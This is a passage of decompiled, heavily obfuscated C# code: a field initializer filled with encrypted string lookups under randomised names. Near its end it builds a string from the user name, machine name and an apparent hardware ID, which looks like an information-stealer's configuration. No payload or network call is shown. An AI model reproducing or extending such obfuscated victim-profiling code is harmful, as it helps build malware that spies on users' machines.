			GwTsezEgVAuVAU(_0014(107384672)),
			GwTsezEgVAuVAU(_0014(107384599)),
			GwTsezEgVAuVAU(_0014(107384574)),
			GwTsezEgVAuVAU(_0014(107384509)),
			GwTsezEgVAuVAU(_0014(107384452)),
			GwTsezEgVAuVAU(_0014(107384899)),
			GwTsezEgVAuVAU(_0014(107384818)),
			GwTsezEgVAuVAU(_0014(107384753)),
			GwTsezEgVAuVAU(_0014(107384696)),
			GwTsezEgVAuVAU(_0014(107384151)),
			GwTsezEgVAuVAU(_0014(107384110)),
			GwTsezEgVAuVAU(_0014(107384101)),
			GwTsezEgVAuVAU(_0014(107384024)),
			GwTsezEgVAuVAU(_0014(107383995)),
			GwTsezEgVAuVAU(_0014(107383930)),
			GwTsezEgVAuVAU(_0014(107384401)),
			GwTsezEgVAuVAU(_0014(107384368)),
			GwTsezEgVAuVAU(_0014(107384359)),
			GwTsezEgVAuVAU(_0014(107384278)),
			GwTsezEgVAuVAU(_0014(107384265)),
			GwTsezEgVAuVAU(_0014(107384192)),
			GwTsezEgVAuVAU(_0014(107383603)),
			GwTsezEgVAuVAU(_0014(107383590)),
			GwTsezEgVAuVAU(_0014(107383513)),
			GwTsezEgVAuVAU(_0014(107383472)),
			GwTsezEgVAuVAU(_0014(107383431)),
			GwTsezEgVAuVAU(_0014(107383914)),
			GwTsezEgVAuVAU(_0014(107383873)),
			GwTsezEgVAuVAU(_0014(107383808)),
			GwTsezEgVAuVAU(_0014(107383731)),
			GwTsezEgVAuVAU(_0014(107383702)),
			GwTsezEgVAuVAU(_0014(107383689)),
			GwTsezEgVAuVAU(_0014(107383112)),
			GwTsezEgVAuVAU(_0014(107383083)),
			GwTsezEgVAuVAU(_0014(107382994)),
			GwTsezEgVAuVAU(_0014(107382929)),
			GwTsezEgVAuVAU(_0014(107382920)),
			GwTsezEgVAuVAU(_0014(107383403)),
			GwTsezEgVAuVAU(_0014(107383362)),
			GwTsezEgVAuVAU(_0014(107383249)),
			GwTsezEgVAuVAU(_0014(107383188)),
			GwTsezEgVAuVAU(_0014(107382635)),
			GwTsezEgVAuVAU(_0014(107382590)),
			GwTsezEgVAuVAU(_0014(107382557)),
			GwTsezEgVAuVAU(_0014(107382484)),
			GwTsezEgVAuVAU(_0014(107382439)),
			GwTsezEgVAuVAU(_0014(107382874)),
			GwTsezEgVAuVAU(_0014(107382817)),
			GwTsezEgVAuVAU(_0014(107382736)),
			GwTsezEgVAuVAU(_0014(107382707)),
			GwTsezEgVAuVAU(_0014(107382698)),
			GwTsezEgVAuVAU(_0014(107382121)),
			GwTsezEgVAuVAU(_0014(107382040)),
			GwTsezEgVAuVAU(_0014(107382015)),
			GwTsezEgVAuVAU(_0014(107381982)),
			GwTsezEgVAuVAU(_0014(107381921)),
			GwTsezEgVAuVAU(_0014(107382376)),
			GwTsezEgVAuVAU(_0014(107384696)),
			GwTsezEgVAuVAU(_0014(107382287)),
			GwTsezEgVAuVAU(_0014(107382278)),
			GwTsezEgVAuVAU(_0014(107382157)),
			GwTsezEgVAuVAU(_0014(107382144)),
			GwTsezEgVAuVAU(_0014(107381571)),
			GwTsezEgVAuVAU(_0014(107381546)),
			GwTsezEgVAuVAU(_0014(107381501)),
			GwTsezEgVAuVAU(_0014(107381452)),
			GwTsezEgVAuVAU(_0014(107384574)),
			GwTsezEgVAuVAU(_0014(107381387)),
			GwTsezEgVAuVAU(_0014(107381858)),
			GwTsezEgVAuVAU(_0014(107381801)),
			GwTsezEgVAuVAU(_0014(107384509)),
			GwTsezEgVAuVAU(_0014(107381728)),
			GwTsezEgVAuVAU(_0014(107381647)),
			GwTsezEgVAuVAU(_0014(107381046)),
			GwTsezEgVAuVAU(_0014(107380981)),
			GwTsezEgVAuVAU(_0014(107380964)),
			GwTsezEgVAuVAU(_0014(107384899)),
			GwTsezEgVAuVAU(_0014(107380855)),
			GwTsezEgVAuVAU(_0014(107384151)),
			GwTsezEgVAuVAU(_0014(107384818)),
			GwTsezEgVAuVAU(_0014(107381334)),
			GwTsezEgVAuVAU(_0014(107381309)),
			GwTsezEgVAuVAU(_0014(107384753)),
			GwTsezEgVAuVAU(_0014(107381244)),
			GwTsezEgVAuVAU(_0014(107381227)),
			GwTsezEgVAuVAU(_0014(107381146)),
			GwTsezEgVAuVAU(_0014(107384599)),
			GwTsezEgVAuVAU(_0014(107381153)),
			GwTsezEgVAuVAU(_0014(107413332)),
			GwTsezEgVAuVAU(_0014(107413303)),
			GwTsezEgVAuVAU(_0014(107413274)),
			GwTsezEgVAuVAU(_0014(107413229)),
			GwTsezEgVAuVAU(_0014(107413228)),
			GwTsezEgVAuVAU(_0014(107413171)),
			GwTsezEgVAuVAU(_0014(107413158)),
			GwTsezEgVAuVAU(_0014(107413101)),
			GwTsezEgVAuVAU(_0014(107413604)),
			GwTsezEgVAuVAU(_0014(107413527)),
			GwTsezEgVAuVAU(_0014(107413510)),
			GwTsezEgVAuVAU(_0014(107413421)),
			GwTsezEgVAuVAU(_0014(107413420)),
			GwTsezEgVAuVAU(_0014(107413375)),
			GwTsezEgVAuVAU(_0014(107412830)),
			GwTsezEgVAuVAU(_0014(107412757)),
			GwTsezEgVAuVAU(_0014(107384672)),
			GwTsezEgVAuVAU(_0014(107413510)),
			GwTsezEgVAuVAU(_0014(107412748)),
			GwTsezEgVAuVAU(_0014(107412687)),
			GwTsezEgVAuVAU(_0014(107412658)),
			GwTsezEgVAuVAU(_0014(107412641)),
			GwTsezEgVAuVAU(_0014(107413080)),
			GwTsezEgVAuVAU(_0014(107413019)),
			GwTsezEgVAuVAU(_0014(107412946)),
			GwTsezEgVAuVAU(_0014(107412917)),
			GwTsezEgVAuVAU(_0014(107412884)),
			GwTsezEgVAuVAU(_0014(107412331)),
			GwTsezEgVAuVAU(_0014(107412270)),
			GwTsezEgVAuVAU(_0014(107412257)),
			GwTsezEgVAuVAU(_0014(107412192)),
			GwTsezEgVAuVAU(_0014(107412159)),
			GwTsezEgVAuVAU(_0014(107412082)),
			GwTsezEgVAuVAU(_0014(107412533)),
			GwTsezEgVAuVAU(_0014(107412500)),
			GwTsezEgVAuVAU(_0014(107412487)),
			GwTsezEgVAuVAU(_0014(107412422)),
			GwTsezEgVAuVAU(_0014(107412389)),
			GwTsezEgVAuVAU(_0014(107411804)),
			GwTsezEgVAuVAU(_0014(107411787)),
			GwTsezEgVAuVAU(_0014(107385311)),
			GwTsezEgVAuVAU(_0014(107411726)),
			GwTsezEgVAuVAU(_0014(107411669)),
			GwTsezEgVAuVAU(_0014(107411660)),
			GwTsezEgVAuVAU(_0014(107411615)),
			GwTsezEgVAuVAU(_0014(107412054)),
			GwTsezEgVAuVAU(_0014(107412041)),
			GwTsezEgVAuVAU(_0014(107411980)),
			GwTsezEgVAuVAU(_0014(107411899)),
			GwTsezEgVAuVAU(_0014(107411882)),
			GwTsezEgVAuVAU(_0014(107411281)),
			GwTsezEgVAuVAU(_0014(107411224)),
			GwTsezEgVAuVAU(_0014(107411211)),
			GwTsezEgVAuVAU(_0014(107411170)),
			GwTsezEgVAuVAU(_0014(107411113)),
			GwTsezEgVAuVAU(_0014(107385254)),
			GwTsezEgVAuVAU(_0014(107411552)),
			GwTsezEgVAuVAU(_0014(107411523)),
			GwTsezEgVAuVAU(_0014(107411490)),
			GwTsezEgVAuVAU(_0014(107411417)),
			GwTsezEgVAuVAU(_0014(107411388)),
			GwTsezEgVAuVAU(_0014(107385328)),
			GwTsezEgVAuVAU(_0014(107411347)),
			GwTsezEgVAuVAU(_0014(107411330)),
			GwTsezEgVAuVAU(_0014(107410789)),
			GwTsezEgVAuVAU(_0014(107383083)),
			GwTsezEgVAuVAU(_0014(107410756)),
			GwTsezEgVAuVAU(_0014(107410789)),
			GwTsezEgVAuVAU(_0014(107410727)),
			GwTsezEgVAuVAU(_0014(107410698)),
			GwTsezEgVAuVAU(_0014(107410637)),
			GwTsezEgVAuVAU(_0014(107410588)),
			GwTsezEgVAuVAU(_0014(107410571)),
			GwTsezEgVAuVAU(_0014(107411042)),
			GwTsezEgVAuVAU(_0014(107410981)),
			GwTsezEgVAuVAU(_0014(107410952)),
			GwTsezEgVAuVAU(_0014(107410911)),
			GwTsezEgVAuVAU(_0014(107410834)),
			GwTsezEgVAuVAU(_0014(107410821)),
			GwTsezEgVAuVAU(_0014(107410276)),
			GwTsezEgVAuVAU(_0014(107410219)),
			GwTsezEgVAuVAU(_0014(107410174)),
			GwTsezEgVAuVAU(_0014(107410117)),
			GwTsezEgVAuVAU(_0014(107410084)),
			GwTsezEgVAuVAU(_0014(107410523)),
			GwTsezEgVAuVAU(_0014(107410526)),
			GwTsezEgVAuVAU(_0014(107410465)),
			GwTsezEgVAuVAU(_0014(107410432)),
			GwTsezEgVAuVAU(_0014(107410375)),
			GwTsezEgVAuVAU(_0014(107410334)),
			GwTsezEgVAuVAU(_0014(107409741)),
			GwTsezEgVAuVAU(_0014(107409740)),
			GwTsezEgVAuVAU(_0014(107409659)),
			GwTsezEgVAuVAU(_0014(107409614)),
			GwTsezEgVAuVAU(_0014(107409597)),
			GwTsezEgVAuVAU(_0014(107409520)),
			GwTsezEgVAuVAU(_0014(107410015)),
			GwTsezEgVAuVAU(_0014(107409982)),
			GwTsezEgVAuVAU(_0014(107409909)),
			GwTsezEgVAuVAU(_0014(107409900)),
			GwTsezEgVAuVAU(_0014(107409855)),
			GwTsezEgVAuVAU(_0014(107413080)),
			GwTsezEgVAuVAU(_0014(107409822)),
			GwTsezEgVAuVAU(_0014(107409237)),
			GwTsezEgVAuVAU(_0014(107409180)),
			GwTsezEgVAuVAU(_0014(107409183)),
			GwTsezEgVAuVAU(_0014(107409150)),
			GwTsezEgVAuVAU(_0014(107409117)),
			GwTsezEgVAuVAU(_0014(107409068)),
			GwTsezEgVAuVAU(_0014(107409007)),
			GwTsezEgVAuVAU(_0014(107409506)),
			GwTsezEgVAuVAU(_0014(107409429)),
			GwTsezEgVAuVAU(_0014(107409420)),
			GwTsezEgVAuVAU(_0014(107409331)),
			GwTsezEgVAuVAU(_0014(107409314)),
			GwTsezEgVAuVAU(_0014(107409285)),
			GwTsezEgVAuVAU(_0014(107408696))
		};
		iSGwXCiIfXBR = new List<string>
		{
			GwTsezEgVAuVAU(_0014(107408655)),
			GwTsezEgVAuVAU(_0014(107408638)),
			GwTsezEgVAuVAU(_0014(107408557)),
			GwTsezEgVAuVAU(_0014(107408508)),
			GwTsezEgVAuVAU(_0014(107409003)),
			GwTsezEgVAuVAU(_0014(107408938)),
			GwTsezEgVAuVAU(_0014(107408861)),
			GwTsezEgVAuVAU(_0014(107408800))
		};
		jFoYvbvoLRCagvDFmn = new List<string>
		{
			GwTsezEgVAuVAU(_0014(107408231)),
			GwTsezEgVAuVAU(_0014(107408198)),
			GwTsezEgVAuVAU(_0014(107408121)),
			GwTsezEgVAuVAU(_0014(107408104)),
			GwTsezEgVAuVAU(_0014(107408071)),
			GwTsezEgVAuVAU(_0014(107407990)),
			GwTsezEgVAuVAU(_0014(107408489)),
			GwTsezEgVAuVAU(_0014(107408456)),
			GwTsezEgVAuVAU(_0014(107408423)),
			GwTsezEgVAuVAU(_0014(107408390)),
			GwTsezEgVAuVAU(_0014(107408357)),
			GwTsezEgVAuVAU(_0014(107408324)),
			GwTsezEgVAuVAU(_0014(107408251)),
			GwTsezEgVAuVAU(_0014(107407698)),
			GwTsezEgVAuVAU(_0014(107407685)),
			GwTsezEgVAuVAU(_0014(107407652)),
			GwTsezEgVAuVAU(_0014(107407579)),
			GwTsezEgVAuVAU(_0014(107407546)),
			GwTsezEgVAuVAU(_0014(107407505)),
			GwTsezEgVAuVAU(_0014(107407496)),
			GwTsezEgVAuVAU(_0014(107407975)),
			GwTsezEgVAuVAU(_0014(107407934)),
			GwTsezEgVAuVAU(_0014(107407901)),
			GwTsezEgVAuVAU(_0014(107408231)),
			GwTsezEgVAuVAU(_0014(107407828)),
			GwTsezEgVAuVAU(_0014(107407819)),
			GwTsezEgVAuVAU(_0014(107407774)),
			GwTsezEgVAuVAU(_0014(107407741)),
			GwTsezEgVAuVAU(_0014(107407156)),
			GwTsezEgVAuVAU(_0014(107407147)),
			GwTsezEgVAuVAU(_0014(107407114)),
			GwTsezEgVAuVAU(_0014(107407073)),
			GwTsezEgVAuVAU(_0014(107407000)),
			GwTsezEgVAuVAU(_0014(107408198)),
			GwTsezEgVAuVAU(_0014(107406959)),
			GwTsezEgVAuVAU(_0014(107408121)),
			GwTsezEgVAuVAU(_0014(107407438)),
			GwTsezEgVAuVAU(_0014(107407405)),
			GwTsezEgVAuVAU(_0014(107407396)),
			GwTsezEgVAuVAU(_0014(107407363)),
			GwTsezEgVAuVAU(_0014(107407290)),
			GwTsezEgVAuVAU(_0014(107407249)),
			GwTsezEgVAuVAU(_0014(107407216)),
			GwTsezEgVAuVAU(_0014(107406671)),
			GwTsezEgVAuVAU(_0014(107406662)),
			GwTsezEgVAuVAU(_0014(107406621)),
			GwTsezEgVAuVAU(_0014(107406548))
		};
		BSHtnNKwjXivMJS = new List<string>
		{
			GwTsezEgVAuVAU(VSGqbgWciAAQ(_0014(107406539))),
			GwTsezEgVAuVAU(_0014(107406458)),
			GwTsezEgVAuVAU(_0014(107406909)),
			GwTsezEgVAuVAU(_0014(107406780)),
			GwTsezEgVAuVAU(_0014(107406719)),
			GwTsezEgVAuVAU(_0014(107406110)),
			GwTsezEgVAuVAU(_0014(107406017)),
			GwTsezEgVAuVAU(_0014(107406432)),
			GwTsezEgVAuVAU(_0014(107406339)),
			GwTsezEgVAuVAU(_0014(107406242)),
			GwTsezEgVAuVAU(_0014(107405637)),
			GwTsezEgVAuVAU(_0014(107405540)),
			GwTsezEgVAuVAU(_0014(107405447)),
			GwTsezEgVAuVAU(VSGqbgWciAAQ(_0014(107406539)))
		};
		AbUTAcXZWDez = GwTsezEgVAuVAU(_0014(107405862));
		hkXnlfpoGpnf = new List<string>
		{
			GwTsezEgVAuVAU(_0014(107405717)),
			GwTsezEgVAuVAU(_0014(107405011)),
			GwTsezEgVAuVAU(_0014(107405329)),
			GwTsezEgVAuVAU(_0014(107404623)),
			GwTsezEgVAuVAU(_0014(107404429)),
			GwTsezEgVAuVAU(_0014(107404779))
		};
		gNbydKfEzpWjv = new List<string>
		{
			GwTsezEgVAuVAU(_0014(107404073)),
			GwTsezEgVAuVAU(_0014(107404012)),
			GwTsezEgVAuVAU(_0014(107403919))
		};
		apDKFRuernzH = _0014(107397015);
		rmnvFBReavI = _0014(107397015);
		mfBqYHSOySd = new DateTime(2000, 1, 1);
		mvolkwWivlBcrm = new DateTime(2100, 1, 1);
		CdQMIPJOkrOUDSy = _0014(107396855);
		xYkYbBCyjIxz = _0014(107386849);
		eIevaseXuHQaH = _0014(107397015);
		bdIGvvMoxCbM = _0014(107397015);
		TuoGtjjIwGaoMFyS = _0014(107397015);
		ofNBDRGhqfTF = _0014(107396855);
		kdEfNQYswVmDU = _0014(107397015);
		bxhZXFvKXZl = _0014(107397015);
		EKjYgfCTgvyfhvOPx = new List<string>
		{
			_0014(107395908),
			_0014(107396134),
			_0014(107395942),
			_0014(107395983)
		};
		vEWBFQaTPDgk = _0014(107397015);
		PyFcFDpqJkSW = _0014(107404370);
		MIRuXWVFFoLwtz = _0014(107396855);
		VsxmPTvejQSFs = _0014(107397015);
		ZxaKxHsjfdsdTvNKy = _0014(107397015);
		KtQjokjXHZXUlt = string.Empty;
		nvUGpJjfEl = _0014(107397015);
		esDOwQNWzCks = _0014(107397015);
		RzJDQuVkTCTlk = _0014(107397015);
		vKUIQhdzgPHwb = _0014(107388695);
		GfViqMwSHVEX = _0014(107388695);
		IUCNbNITnGCo = _0014(107397015);
		sQphlXbTpcR = _0014(107397015);
		ltuxRtIPjttT = _0014(107396855);
		aDFaQrSzgBxEj = _0014(107397015);
		nLNEEVaUjoQklOdfI = _0014(107397015);
		anwdjQbJZQFrk = _0014(107404365);
		PxoomWcCvZubT = _0014(107397015);
		NRDQBoJkcw = _0014(107397015);
		LIbWxYpDOmPy = _0014(107404348);
		rHeEvpAbjCjyvEaC = _0014(107397015);
		NfiNMrNQVxA = _0014(107397015);
		JOmKsEZdamZ = _0014(107396855);
		befQPNWerVGdKp = _0014(107397015);
		aEpEnRRNDPnpp = _0014(107404363);
		QArBXOfqRoEA = _0014(107396855);
		QGAYpwMzxm = _0014(107396855);
		cbYwmSYgAK = _0014(107397015);
		tMTGisYcNMVHo = _0014(107397015);
		tPINiNFcqTnZtQ = new string[0];
		POXokwFKrkkHxdVH = _0014(107397015);
		VGKELVlTFUV = true;
		ZHbEFyHPlfyw = _0014(107397015);
		IooTTsvIiwCN = true;
		fOGrPeGaBiaPoAHL = false;
		MVhCfgBRSEUkeJ = false;
		NBgAYvhpqTo = false;
		jnRLNtXuRRg = _0014(107404350);
		joesCNAxeHUI = false;
		XqTYpFCObzAK = false;
		WmBMdIXNbOD = true;
		upflSQRmeWP = false;
		EcdpqbMrQOzfdgL = true;
		diaHTfOFnw = _0014(107404329) + Environment.UserName + _0014(107404284) + Environment.MachineName + _0014(107404295) + GyWbmViNanxKl.nFyAFAYBITHjh() + _0014(107404290);
		qoRjYABduZF = false;
		uYmJJOwnKLBSZO = new Stopwatch();
		iePhSHBTqLd = 0;
		XnicJWCgBOO = 0;
		MiZHZrKmtKkaPXn = false;
		RBZnAGRnuwHeRmi = _0014(107404249) + GyWbmViNanxKl.nFyAFAYBITHjh() + _0014(107404240);
		sohDoFMGJgbq = new string[1] { _0014(107404267) };
		HXQxyzlRKB = new List<string>();
		rHOZvgFGaXKMdexR = 0;
	}
}
